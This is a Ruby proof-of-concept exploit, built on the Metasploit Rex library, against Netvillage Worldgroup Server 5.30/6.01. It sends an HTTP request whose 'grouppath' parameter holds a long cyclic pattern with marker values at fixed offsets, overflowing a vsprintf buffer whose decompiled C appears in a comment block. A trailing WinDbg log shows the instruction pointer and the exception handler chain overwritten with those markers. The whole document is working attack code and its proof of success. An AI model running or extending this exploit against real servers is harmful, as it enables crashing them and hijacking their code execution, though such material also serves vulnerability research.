#!/usr/bin/env ruby
# netvillage Social Networking Solutions (wg61)
require 'rex'

host = ARGV[0]

def usage
 puts "[*] #{$0} <host>"
 exit
end

usage if ARGV.size < 1

begin
sock = Rex::Proto::Http::Client.new(host, port = "80", context = {}, ssl = false)

=begin
const char *spr(char *format, ...)
{
  const char *v1; // ebx@1
  void *retaddr; // [sp+8h] [bp+4h]@2
  va_list va; // [sp+10h] [bp+Ch]@1

  va_start(va, format);
  dword_45A0C0 = ((_BYTE)dword_45A0C0 + 1) & 3;
  v1 = &byte_46746C[120 * dword_45A0C0];
  vsprintf(&byte_46746C[120 * dword_45A0C0], format, va);
  if ( strlen(v1) >= 0x78 )
    catastro("OVERSIZED SPR() CALL FROM %04X:%04X\n\"%s\"", SBYTE2(retaddr));
  return v1;
}
=end

     # Netvillage Worldgroup Server 5.30/6.01
     fuzz = Rex::Text.pattern_create(2024)
     fuzz[1323,4] = [0xdeadbeef].pack('V')
     fuzz[1327,4] = [0xfeedface].pack('V')

     req = sock.request_raw(
            {
               'uri'     => "/news/list/news/?grouppath=/#{fuzz}",
               'cookie'  => "WebLiteAuth=",
               'headers' => {
                 'Referer' => "http://#{host}/News",
               },
            },)
 
      sock.send_request(req)
      data = sock.read_response()

rescue => e
puts "[!] #{e.to_s}"
end
__END__
0:005> g
ModLoad: 06240000 06246000   C:\WGSERV\wgswelog.dll
(b14.f64): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=feedface edx=772c71f4 esi=00000000 edi=00000000
eip=feedface esp=0012e36c ebp=0012e38c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
feedface ??              ???
0:000> !exchain
0012e380: ntdll!RtlRaiseStatus+ef (772c71f4)
0012f2c4: feedface
Invalid exception stack at deadbeef

